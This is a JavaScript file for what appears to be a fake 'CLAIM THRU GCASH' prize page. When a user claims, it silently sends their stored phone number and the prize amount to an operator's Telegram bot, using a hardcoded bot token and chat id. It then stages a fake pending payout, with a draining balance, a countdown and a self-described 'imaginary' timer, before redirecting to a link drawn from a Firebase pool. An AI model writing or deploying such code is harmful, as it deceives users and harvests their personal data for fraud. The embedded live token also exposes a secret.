let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

// Check if Firewall is active
async function isFirewallActive() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/globalFirewall').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) {
            return false;
        }
    }
    return false;
}

// Send notification to admin when user requests verification
async function sendVerificationRequestNotification(phone, amount) {
    const message = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
    } catch(e) {
        console.log("Telegram error:", e);
    }
}

// Show claim popup - main entry point
async function showClaimPopup(amount) {
    const firewallActive = await isFirewallActive();
    
    if (firewallActive) {
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        await sendVerificationRequestNotification(userPhone, amount);
        if (typeof window.showFirewallPopup === 'function') {
            window.showFirewallPopup();
        }
        return;
    }
    
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    if (popup) popup.style.display = 'none';
}

function showPendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'block';
    claimState.isPending = true;
}

function hidePendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'none';
    claimState.isPending = false;
}

function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const totalDuration = 3500;
    const intervalTime = 50;
    const steps = totalDuration / intervalTime;
    const decrementPerStep = originalAmount / steps;
    let stepCount = 0;
    
    claimState.balanceDecrementInterval = setInterval(() => {
        stepCount++;
        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
        balanceText.innerText = "₱" + current.toFixed(2);
        
        if (current <= 0.01) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');
    
    if (!timerSpan) return;
    
    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            
            // Restore original balance
            const balanceText = document.getElementById('balanceText');
            if (balanceText) {
                balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            }
            
            // Update Firebase balance
            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                window.parent.updateGameBalance(originalAmount);
            } else if (typeof updateGameBalance === 'function') {
                updateGameBalance(originalAmount);
            } else if (typeof GameState !== 'undefined') {
                GameState.balance = originalAmount;
                if (typeof updateUI === 'function') updateUI();
                if (typeof saveData === 'function') saveData();
            }
            
            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';
            
            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 3500);
}

function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone, 
                    amount: amount, 
                    claimedAt: Date.now() 
                });
                
                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount);
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);
                
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("No available rewards!");
            }
        }).catch(() => {
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
        });
    }
}

document.addEventListener('DOMContentLoaded', function() {
    hidePendingStatus();
});
